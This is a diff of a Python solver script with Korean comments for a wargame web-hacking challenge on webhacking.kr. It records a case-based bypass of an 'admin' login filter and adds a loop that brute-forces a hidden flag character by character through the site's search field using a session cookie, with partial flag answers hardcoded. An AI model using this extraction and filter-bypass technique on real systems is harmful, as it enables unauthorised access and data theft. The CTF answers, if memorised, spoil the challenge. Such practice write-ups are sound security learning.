@@ -52,3 +52,22 @@ print(passwd) 원하는 값
 '''
 
 #아이디 비번 알아내서 로그인할려했는데 admin이 필터링 되어있는듯 로그인이 안됨. 그래서 ADMIN 대문자로 했더니 성공!(아마 MSSQL에 대소문자 처리 안되어있어서 php에서만 admin을 거르는것 같음)
+print(chr(37))
+password= "FLAG_himIKO_tO_a_is_cuT__doNT_yOU_tHIN__sO_}"
+password2="flag{HIM_ko_tO_a_is_cuT__doNT_yOU_tHIN__sO_}"
+passwd="flag{"
+url="https://webhacking.kr/challenge/web-33/index.php?"
+
+print(password2.lower())
+for i in range(1,50): #원래는 1 부터 길이+1 까지
+    for j in range(65, 96): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
+        if(chr(j)=="%"):
+            continue
+        payload=session.post(url,data={"search":passwd+chr(j)},cookies=cookie)
+        if ("readme" in payload.text):
+            print(chr(j) + " is correct!!!!!!!")
+            passwd += chr(j)
+            print(passwd)
+            break
+
+print(passwd)
